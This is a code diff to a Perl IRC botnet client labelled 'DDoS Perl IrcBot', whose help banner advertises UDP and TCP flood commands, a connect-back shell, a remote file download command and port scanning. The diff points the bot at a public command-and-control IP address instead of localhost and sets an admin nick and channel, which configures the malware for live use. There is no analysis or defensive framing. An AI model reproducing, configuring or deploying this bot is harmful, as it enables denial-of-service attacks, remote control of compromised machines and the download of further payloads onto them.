@@ -8,7 +8,7 @@ use warnings;
  
 ######################################################################################################################
 ######################################################################################################################
-##  DDoS Perl IrcBot v1.0 / 2016 modded by  phl4nk	       ## [ Help ] #########################################
+##  DDoS Perl IrcBot v1.0 / 2016 modded by  phl4nk	            ## [ Help ] ###########################################
 ##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
 ##        Teste on every system with PERL instlled             ##  !u @system                                       ##
 ##                                                             ##  !u @version                                      ##
@@ -18,7 +18,7 @@ use warnings;
 ######################################################################################################################
 ## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
 ######################################################################################################################
-##  !u @join <#channel>            ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
+##  !u @join <#channel>          ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
 ##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
 ##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
 ##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
@@ -56,15 +56,15 @@ my @rircname = ("zombie");
 my $ircname = $rircname[rand scalar @rircname];
 chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
-my $server = '127.0.0.1';
+my $server = '188.68.35.76';
 my $port = '6667';
 my $linas_max='8';
 my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'v.02';
-my @admins = ("admin");
+my @admins = ("Conejo");
 #my @hostauth = ("gov");
-my @channels = ("#bot_room");
+my @channels = ("#test2");
 my $pacotes = 1;
 
 #################################################################
@@ -301,15 +301,15 @@ my $funcarg = $_[1];
 ###########################
  
 if ($funcarg =~ /^help/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1phl4nk PerlBot Main Help:  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1system              ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1version             ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1channel             ");   
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1flood               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1utils               ");   
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] ======================= ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] phl4nk PerlBot Main Help:  ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] ======================= ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] !u @system              ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] !u @version             ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] !u @channel             ");   
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] !u @flood               ");
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] !u @utils               ");   
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] ======================= ");
 }
  
 if ($funcarg =~ /^system/) {
